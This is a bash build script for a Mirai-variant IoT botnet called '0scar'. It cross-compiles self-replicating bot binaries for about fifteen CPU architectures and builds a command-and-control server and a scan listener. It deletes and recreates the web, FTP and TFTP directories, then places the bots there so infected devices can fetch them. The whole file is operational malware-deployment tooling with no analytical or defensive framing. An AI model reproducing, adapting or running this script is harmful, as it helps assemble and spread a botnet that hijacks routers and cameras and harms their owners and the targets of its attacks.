#!/bin/bash

export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin

export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
                                                                                                                                                                                                               
function arc_compile {
    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" -std=c99 bot/*.c -s -o release/"$2"
}

function compile_armv7 {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}
                                                                                                                                                                                      
rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp

mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/bins

go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/

go build -o loader/scanListen scanListen.go
touch ~/message.txt

echo "Compiling - i486"
compile_bot i486 0scar.i486 "-static -DKATANASELFREP"

echo "Compiling - x86"
compile_bot i586 0scar.x86 "-static -DKATANASELFREP"

echo "Compiling - i686"
compile_bot i686 0scar.i686 "-static -DKATANASELFREP"

echo "Compiling - X86_64"
compile_bot x86_64 0scar.x86_64 "-static -DKATANASELFREP"

echo "Compiling - MIPS"
compile_bot mips 0scar.mips "-static -DKATANASELFREP"

echo "Compiling - MIPSEL"
compile_bot mipsel 0scar.mpsl "-static -DKATANASELFREP"

echo "Compiling - ARM/ARMv4"
compile_bot armv4l 0scar.arm "-static -DKATANASELFREP"

echo "Compiling - ARMv5"
compile_bot armv5l 0scar.arm5 " -DKATANASELFREP"

echo "Compiling - ARMv6"
compile_bot armv6l 0scar.arm6 "-static -DKATANASELFREP"

echo "Compiling - ARMv7"
compile_armv7 armv7l 0scar.arm7 "-static -DKATANASELFREP"

echo "Compiling - POWERPC"
compile_bot powerpc 0scar.ppc "-static -DKATANASELFREP"

echo "Compiling - SPARC"
compile_bot sparc 0scar.spc "-static -DKATANASELFREP"

echo "Compiling - M68K"
compile_bot m68k 0scar.m68k "-static -DKATANASELFREP"

echo "Compiling - SH4"
compile_bot sh4 0scar.sh4 "-static -DKATANASELFREP"

echo "Compiling - ARC"
arc_compile arc 0scar.arc "-static -DKATANASELFREP"

compile_bot x86_64 debug.dbg "-static -DDEBUG -DKATANASELFREP"

mv release/*.dbg /root/
mv *dbg debug.amd64
cp release/0scar.* /var/www/html/bins
cp release/0scar.* /var/ftp
cp release/0scar.* /var/lib/tftpboot



